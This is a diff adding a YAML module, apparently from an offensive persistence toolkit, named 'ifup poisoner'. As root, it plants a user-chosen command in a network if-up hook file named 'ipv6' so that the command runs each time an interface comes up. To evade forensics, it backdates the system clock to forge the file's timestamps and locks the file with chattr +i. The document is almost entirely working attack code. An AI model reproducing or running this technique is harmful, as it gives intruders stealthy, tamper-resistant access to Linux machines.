@@ -1,0 +1,18 @@
+name: "ifup poisoner"
+description: "Adds ifup entry with command execution"
+category: persistence
+need_root: true
+variables:
+  - name: cmd
+    description: "Command to execute"
+priority: 1000
+tip: "Ifup is poisoned with command '{{cmd}}'"
+script: |
+  NOW=$(date +@%s)
+  date -s "$(stat -c '@%Z' /etc/hostname)"
+  echo "#!/bin/sh" | tee /etc/network/if-up.d/ipv6
+  echo "{{cmd}}" | tee -a /etc/network/if-up.d/ipv6
+  touch /etc/network/if-up.d/ipv6
+  chattr +i /etc/network/if-up.d/ipv6
+  date -s "$NOW"
+  unset NOW
